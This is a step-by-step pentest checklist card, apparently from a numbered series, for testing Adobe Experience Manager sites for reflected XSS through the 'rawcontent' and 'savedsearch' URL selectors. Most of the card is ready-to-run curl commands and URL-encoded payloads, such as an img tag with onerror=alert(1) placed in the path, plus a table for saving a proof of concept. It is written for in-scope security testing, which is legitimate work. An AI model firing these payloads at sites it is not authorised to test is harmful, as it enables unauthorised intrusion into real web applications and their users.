# Batch 09 — XSS cheat code `rawcontent`

## FILL IN

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"
```

## GOAL
See if adding `.rawcontent.html` turns a reflected path into script (XSS).

## TIME
~1 hour

## YOU NEED
- XSS allowed in scope
- Browser for final check

---

## WHY (30 seconds)

AEM has **selectors** = extra words in the URL that change how a page renders.

`rawcontent` was meant to strip fancy JS/CSS for export.  
On old/misconfigured boxes it also **broke HTML cleaning**, so a path like  
`/<img ...>.rawcontent.html` ran as script.  
If the 404 page is fixed, `savedsearch` + `rawcontent` hits a different error page that still reflects.

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
```

### 1) Safe marker (no alert)

```bash
curl -sk -o /tmp/x.html -w "%{http_code}\n" \
  "$T/aemxssmarker123.rawcontent.html"
grep -n 'aemxssmarker123' /tmp/x.html | head
```

### 2) XSS path (historical)

```bash
curl -sk -o /tmp/x.html -w "%{http_code}\n" \
  "$T/%3Cimg%20src=x%20onerror=alert(1)%3E.rawcontent.html"
grep -iE 'onerror|<img' /tmp/x.html | head
```

Browser if it looks raw:

```text
https://SITE/<img src=x onerror=alert(1)>.rawcontent.html
```

### 3) Backup error page

```bash
curl -sk -o /tmp/x.html -w "%{http_code}\n" \
  "$T/%3Cimg%20src=x%20onerror=alert(1).savedsearch.rawcontent.html"
grep -iE 'onerror|<img' /tmp/x.html | head
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| alert / raw onerror in HTML | PoC saved → **NEXT** |
| Marker not in page | Custom errors / patched → **NEXT** anyway |

---

## NEXT
→ [10-listparagraphs.md](./10-listparagraphs.md)
